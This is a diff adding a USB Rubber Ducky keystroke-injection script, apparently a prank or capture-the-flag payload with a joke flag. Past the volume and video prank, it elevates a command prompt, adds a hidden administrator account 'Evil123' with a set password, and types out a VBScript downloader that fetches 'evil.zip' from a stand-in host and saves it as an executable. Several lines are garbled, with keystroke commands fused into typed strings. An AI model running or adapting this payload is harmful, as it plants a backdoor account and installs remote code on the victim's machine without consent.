@@ -1,0 +1,92 @@
+DELAY 
+STRING terminal
+ENTER
+STRING powershell.exe
+ENTER
+STRING Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50 | % {$wshShell.SendKeys([char]174)};1..$Volume | % {$wshShell.SendKeys([char]175)}}
+ENTER
+STRING Set-Speaker -Volume 50
+ENTER
+STRING https://www.bilibili.com/video/BV1uT4y1P7CX
+DELAY
+STRING Fsay 'flag{N3ver_G0nn@_G1ve_You_Up}'
+ENTER
+DELAY
+DELAY
+DELAY
+DELAY
+STRING powershell Start-Process cmd -Verb runAsMENU
+ENTER
+LEFTARROW
+ENTER
+DELAY
+LEFTARROW
+DELAY
+ENTER
+DELAY
+STRING net user /add Evil123 L00k1TDELAY
+ENTER
+DELAY
+STRING net localgroup administrators Evil123 /add
+DELAY
+ENTER
+DELAY
+STRING exit
+DELAY
+ENTER
+STRING https://goo.gl/YgjiprENTER
+STRING cmd
+ENTER
+STRING echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+ENTER
+STRING echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+ENTER
+STRING echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+ENTER
+STRING echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+ENTER
+STRING echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+ENTER
+STRING echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+ENTER
+STRING echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+ENTER
+STRING echo Err.Clear >> wget.vbs
+ENTER
+STRING echo Set http = Nothing >> wget.vbs
+ENTER
+STRING echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+ENTER
+STRING echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+ENTER
+STRING echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+ENTER
+STRING echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+ENTER
+STRING echo http.Open "GET", strURL, False >> wget.vbs
+ENTER
+STRING echo http.Send >> wget.vbs
+ENTER
+STRING echo varByteArray = http.ResponseBody >> wget.vbs
+ENTER
+STRING echo Set http = Nothing >> wget.vbs
+ENTER
+STRING echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+ENTER
+STRING echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+ENTER
+STRING echo strData = "" >> wget.vbs
+ENTER
+STRING echo strBuffer = "" >> wget.vbs
+ENTER
+STRING echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+ENTER
+STRING echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+ENTER
+STRING echo Next >> wget.vbs
+ENTER
+STRING echo ts.Close >> wget.vbs
+ENTER
+STRING cscript wget.vbs http://yoursite.com/evil.zip evil.exe
+ENTER
+DELAY
